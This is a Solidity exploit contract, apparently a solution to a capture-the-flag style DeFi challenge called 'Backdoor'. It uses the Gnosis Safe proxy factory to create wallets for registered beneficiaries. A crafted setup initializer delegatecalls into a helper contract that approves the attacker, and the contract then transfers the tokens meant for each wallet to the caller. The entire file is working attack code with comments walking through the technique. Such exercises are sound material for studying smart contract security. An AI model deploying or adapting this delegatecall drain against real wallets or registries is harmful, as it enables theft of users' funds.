// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";


contract DelegateCallContract {
    function delegateCallback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}



contract BackdoorExploit {


    constructor(address[] memory _initialBeneficiaries,
                address          _walletRegistry ) {


        DelegateCallContract delegateCallback = new DelegateCallContract();
        WalletRegistry walletRegistry       = WalletRegistry(_walletRegistry);
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        IERC20 token                        = walletRegistry.token();


        for(uint256 i = 0; i < _initialBeneficiaries.length; i++){
            address[] memory owners = new address[](1);
            owners[0] = _initialBeneficiaries[i];
            console.log("owner: ", owners[0]);

            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // function selector = GnosisSafe.setup.selector
                owners,                    // 1 safe owner; the beneficiary
                1,                         // 1 confirmation required for a safe transaction
                address(delegateCallback), // delegatecall() from new GnosisSafeProxy into attack contract
                                           // function selector of delegatecall attack function + params
                abi.encodeWithSelector(DelegateCallContract.delegateCallback.selector, 
                                       address(token), address(this), 10 ether),
                address(0),                // no fallbackHandler
                address(0),                // no paymentToken
                0,                         // no payment
                address(0)                 // no paymentReceiver
            );


            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(
                walletRegistry.masterCopy(), 
                initializer, 
                i, 
                IProxyCreationCallback(_walletRegistry) 
            );

            require(token.allowance(address(safeProxy), address(this)) == 10 ether);
            token.transferFrom(address(safeProxy), msg.sender, 10 ether);
        }    
    }    
}